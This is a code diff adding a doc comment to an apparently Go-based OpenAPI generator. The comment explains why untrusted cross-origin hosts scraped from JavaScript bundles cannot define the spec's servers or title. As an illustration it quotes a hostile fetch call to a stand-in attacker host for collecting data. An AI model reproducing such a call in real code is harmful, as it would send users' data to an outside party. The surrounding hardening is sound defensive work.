@@ -19,6 +19,21 @@
 //
 // Key components:
 //   - [OpenAPIGenerator] produces a valid OpenAPI 3.0 document in YAML format.
+//     [OpenAPIGenerator.TargetOrigin] is the origin the run can vouch for (the
+//     resolved target origin, from --target-url or the capture's own HTML
+//     page). The document's `servers` list and `info.title` derive from that
+//     trusted origin plus dynamically observed hosts; an unprobed JS-static
+//     candidate (crawl.IsJSStaticSource) may join `servers` only when it is
+//     same-origin with it. A cross-origin JS-static host therefore can never
+//     define the deliverable's identity — its bundle text was never fetched or
+//     executed, so a hostile literal like
+//     fetch("https://attacker.example/collect") must not be able to occupy
+//     servers[0] or capture info.title by sorting first (SEC-BE-002, LAB-4992
+//     review). Such a host is not silently relabelled either: the endpoints on
+//     it keep their real origin via a per-operation `servers` override, so a
+//     recovered path is never attributed to a host that does not serve it
+//     (SEC-BE-001). static:html is deliberately NOT treated as JS-static here —
+//     the page carrying the form was fetched over the wire during the crawl.
 //   - [NormalizePathsWithNames] is the primary normalization entry point. It
 //     accepts a population of observed paths and returns a map of input path
 //     to template path, performing both single-path regex detection (UUIDs,
